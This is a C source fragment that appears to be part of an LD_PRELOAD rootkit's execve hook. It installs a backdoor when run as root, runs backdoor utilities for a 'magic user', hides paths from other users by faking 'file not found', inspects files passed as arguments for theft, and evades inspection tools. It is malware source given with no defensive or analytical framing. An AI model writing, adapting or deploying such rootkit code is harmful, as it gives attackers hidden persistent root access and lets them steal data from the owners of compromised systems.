int execve(const char *filename, char *const argv[], char *const envp[]){
    if(!notuser(0) && rknomore() &&
                                #ifdef PATCH_DYNAMIC_LINKER
                                !preloadok(PRELOAD_FILE)
                                #else
                                !preloadok(OLD_PRELOAD)
                                #endif
                                && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
        bdvinstall(argv);

    plsdomefirst();

    hook(CEXECVE);

    if(magicusr()){
#ifdef BACKDOOR_ROLF
        if(!fnmatch("*/bdvprep", argv[0], FNM_PATHNAME))
            bdprep();
#endif
#ifdef BACKDOOR_UTIL
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
            dobdvutil(argv);
#endif
        return (long)call(CEXECVE, filename, argv, envp);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#ifdef FILE_STEAL
    for(int i = 1; argv[i] != NULL; i++)
        inspectfile(argv[i]);
#endif

#ifdef DO_EVASIONS
    int evasion_status = evade(filename, argv, envp);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVE, filename, argv, envp);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

    return (long)call(CEXECVE, filename, argv, envp);
}
